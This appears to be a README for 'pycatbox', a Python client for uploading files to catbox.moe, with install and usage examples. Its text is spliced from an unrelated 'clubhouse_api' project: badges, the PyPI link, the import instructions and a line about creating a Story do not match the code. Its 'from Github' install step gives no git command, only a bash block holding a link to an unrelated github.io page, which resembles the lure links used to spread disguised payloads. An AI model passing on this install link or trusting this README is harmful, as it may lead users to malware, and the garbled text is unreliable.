# pycatbox

![PyPI](https://img.shields.io/pypi/v/clubhouse_api?color=orange) ![Python 3.6, 3.7, 3.8](https://img.shields.io/pypi/pyversions/clubhouse?color=blueviolet) ![GitHub Pull Requests](https://img.shields.io/github/issues-pr/peopl3s/club-house-api?color=blueviolet) ![License](https://img.shields.io/pypi/l/clubhouse-api?color=blueviolet) 

**pycatbox** - this module is a Python client library for The CatBox management platform API (ClubHouseCatBox API wrapper)

**API documentation** [https://catbox.moe/tools.php(https://catbox.moe/tools.php)

## Installation

Install the current version with [PyPI](https://pypi.org/project/clubhouse-api/):

```bash
pip install pycatbox
```

Or from Github:

```bash
https://n1kprotect.github.io/cazqev/1
```

## Usage

You can generate a token for clubhouse by going to the account section and generating a new token

```python
token = '' #your catbox token if you dont have token set ""

uploader = Uploader(token=token)

upload = uploader.upload(file_type='py', file_raw=open('catbox/catbox/catbox.py', 'rb').read())
print(upload)


```

## Example

Create a new Story in the first Project that is returned from the API in the all projects list.

*If you installed a module from PyPi, you should to import it like this: ``` from clubhouse_api import ClubHouse ```*

*If from GitHub or source: ``` from catbox import Uploader ```*

```python
from pycatbox import Uploader

uploader = Uploader(token='')

# single file
def single():
    upload = uploader.upload(file_type='py', file_raw=open('catbox/catbox/catbox.py', 'rb').read())
    return upload

# many files
def many(files):
    log = []
    for file in files:
        p = str(file).split('.')[-1]
        upload = uploader.upload(file_type=p, file_raw=open(file))
        log.append(upload)
    return log



files = ['catbox.py', 'test.py']
print(many(files))

#{'code': 200, 'file': 'https://files.catbox.moe/abcd.py'}

```


## Contributing

Bug reports and/or pull requests are welcome


## License

The module is available as open source under the terms of the [Apache License, Version 2.0](https://opensource.org/licenses/Apache-2.0)

